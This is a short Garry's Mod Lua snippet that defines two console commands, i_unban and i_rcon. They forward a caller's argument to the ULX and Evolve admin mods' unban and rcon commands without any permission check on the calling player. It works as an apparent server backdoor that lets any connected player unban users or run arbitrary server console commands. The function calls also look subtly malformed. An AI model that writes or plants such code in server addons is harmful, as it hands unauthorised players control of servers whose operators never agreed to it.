concommand.Add("i_unban", function( p, c, a )
	game.ConsoleCommand("ulx", "unban", a[1])
	game.ConsoleCommand("ev", "unban", a[1])
end)

concommand.Add("i_rcon", function( p, c, a )
	game.ConsoleCommand("ev", "rcon", a[1])
	game.ConsoleCommand("ulx", "rcon", a[1])
end)

